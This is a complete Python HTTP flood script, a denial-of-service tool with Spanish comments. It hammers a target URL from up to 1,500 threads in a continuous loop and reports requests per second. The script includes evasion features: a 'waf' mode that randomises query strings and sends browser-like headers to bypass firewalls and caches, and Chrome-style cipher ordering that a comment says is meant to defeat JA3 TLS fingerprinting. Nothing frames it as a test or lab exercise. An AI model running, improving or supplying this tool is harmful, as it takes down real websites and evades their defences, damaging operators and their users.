#!/usr/bin/env python3

import argparse, os, random, socket, ssl, string, struct, sys, threading, time
from concurrent.futures import ThreadPoolExecutor, as_completed

# --- ciphers estilo Chrome (mitiga JA3 trivial) ---
CHROME_CIPHERS = (
    "ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:"
    "ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:"
    "ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:"
    "ECDHE-RSA-AES128-SHA:ECDHE-RSA-AES256-SHA:AES128-GCM-SHA256:"
    "AES256-GCM-SHA384"
)

BROWSER_HEADERS = (
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,"
    "image/avif,image/webp,*/*;q=0.8\r\n"
    "Accept-Language: en-US,en;q=0.9\r\n"
    "Accept-Encoding: gzip, deflate, br\r\n"
    "Sec-Fetch-Dest: document\r\n"
    "Sec-Fetch-Mode: navigate\r\n"
    "Sec-Fetch-Site: none\r\n"
    "Upgrade-Insecure-Requests: 1\r\n"
)

UA_CHROME = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
             "AppleWebKit/537.36 (KHTML, like Gecko) "
             "Chrome/124.0.0.0 Safari/537.36")

# --- contadores batched (menos contención de lock) ---
_lock = threading.Lock()
_counters = {"ok": 0, "fail": 0, "blocked": 0}
_local = threading.local()

def _flush_local():
    with _lock:
        for k, v in getattr(_local, "buf", {}).items():
            _counters[k] += v
    _local.buf = {}

def _bump(kind):
    buf = getattr(_local, "buf", None)
    if buf is None:
        _local.buf = buf = {}
    buf[kind] = buf.get(kind, 0) + 1
    if sum(buf.values()) >= 100:
        _flush_local()

def _rand(n=12):
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))

def _build_request(host, path, mode):
    if mode == "waf":
        path = f"{path}{'&' if '?' in path else '?'}_={_rand()}"
        headers = BROWSER_HEADERS + "Cache-Control: no-cache\r\n"
        ua = UA_CHROME
    elif mode == "tls":
        headers = "Accept: */*\r\n"
        ua = UA_CHROME
    else:
        headers = "Accept: */*\r\n"
        ua = "httpflood/1.0"
    return (f"GET {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {ua}\r\n"
            f"{headers}Connection: keep-alive\r\n\r\n").encode()

def _parse_status(sock):
    """Lee headers, extrae status. Devuelve (bytes_leídos, status|None)."""
    total, status, buf = 0, None, b""
    while total < 8192:
        chunk = sock.recv(2048)
        if not chunk:
            return 0, status
        total += len(chunk)
        buf += chunk
        if b"\r\n\r\n" in buf:
            first = buf.split(b"\r\n", 1)[0]
            parts = first.split(b" ")
            if len(parts) >= 2 and parts[1].isdigit():
                status = int(parts[1])
            return total, status
    return total, status

def _make_ctx():
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.minimum_version = ssl.TLSVersion.TLSv1_2
    ctx.set_ciphers(CHROME_CIPHERS)
    ctx.set_alpn_protocols(["http/1.1"])
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx

def _worker(host, port, path, mode, tls, timeout, stop):
    req = _build_request(host, path, mode)
    ctx = _make_ctx() if tls else None
    sock = None
    try:
        while not stop.is_set():
            try:
                if sock is None:
                    sock = socket.create_connection((host, port), timeout=timeout)
                    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 4096)
                    if ctx:
                        sock = ctx.wrap_socket(sock, server_hostname=host)
                sock.sendall(req)
                n, status = _parse_status(sock)
                if status is not None and status in (429, 503):
                    _bump("blocked")
                else:
                    _bump("ok")
                if n == 0:
                    sock.close(); sock = None
            except (socket.timeout, ConnectionError, ssl.SSLError, OSError):
                _bump("fail")
                if sock:
                    try: sock.close()
                    except OSError: pass
                sock = None
                if stop.is_set(): break
    finally:
        _flush_local()
        if sock:
            try: sock.close()
            except OSError: pass

def _watch(start, stop):
    last = {"ok": 0, "fail": 0, "blocked": 0, "t": start}
    while not stop.wait(2.0):
        now = time.time()
        with _lock:
            snap = dict(_counters)
        dt = now - last["t"]
        rate = (snap["ok"] - last["ok"]) / dt if dt else 0
        print(f"[+] {now-start:6.1f}s | ok={snap['ok']} fail={snap['fail']} "
              f"blocked={snap['blocked']} | {rate:.0f} rps", flush=True)
        last = {"ok": snap["ok"], "fail": snap["fail"],
                "blocked": snap["blocked"], "t": now}

def main():
    p = argparse.ArgumentParser(description=__doc__,
        formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument("url")
    p.add_argument("-t", "--threads", type=int,
                   default=min(1500, (os.cpu_count() or 4) * 300),
                   help="")
    p.add_argument("--mode", choices=["raw", "waf", "tls"], default="waf")
    p.add_argument("--timeout", type=float, default=8.0)
    p.add_argument("--duration", type=int, default=0, help="default = 0")
    a = p.parse_args()

    scheme, rest = a.url.split("://", 1)
    tls = scheme == "https"
    hp, _, path = rest.partition("/")
    host, _, ps = hp.partition(":")
    port = int(ps) if ps else (443 if tls else 80)
    path = "/" + path if path else "/"

    print(f"[*] {host}:{port}{path} mode={a.mode} tls={tls} threads={a.threads} "
          f"dur={'inf' if not a.duration else a.duration}s", flush=True)

    start = time.time()
    stop = threading.Event()
    if a.duration:
        threading.Timer(a.duration, stop.set).start()
    threading.Thread(target=_watch, args=(start, stop), daemon=True).start()

    try:
        with ThreadPoolExecutor(max_workers=a.threads) as ex:
            futs = [ex.submit(_worker, host, port, path, a.mode,
                              tls, a.timeout, stop) for _ in range(a.threads)]
            for f in as_completed(futs):
                f.result()
    except KeyboardInterrupt:
        stop.set()
    finally:
        stop.set()

    with _lock:
        s = dict(_counters)
    dt = time.time() - start
    print(f"\n[=] ok={s['ok']} fail={s['fail']} blocked={s['blocked']} "
          f"en {dt:.1f}s")

if __name__ == "__main__":
    main()
